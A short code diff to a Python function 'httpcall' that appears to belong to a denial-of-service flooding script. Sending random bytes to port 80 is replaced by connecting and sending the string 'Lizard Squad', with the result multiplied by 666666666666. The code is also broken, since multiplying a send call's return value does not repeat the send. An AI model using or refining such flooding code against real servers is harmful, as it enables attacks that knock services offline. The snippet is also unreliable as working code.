@@ -83,9 +83,8 @@ def httpcall(url):
 	bytes = random._urandom(1490)
 	try:
 		
-			
-			s.sendto(bytes,(host,80)) * 666666666666
-			s.recv(1024)
+			s.connect((host,80))
+			s.send("Lizard Squad") * 666666666666
 	except socket.error as e:
 			#print e.code
 			sent = 666666666666
@@ -94,8 +93,9 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			s.sendto(bytes,(host,80)) * 666666666666
-			s.recv(1024)
+			s.connect((host,80))
+			s.send("Lizard Squad") * 666666666666
+			
 	return(code)
 
 	
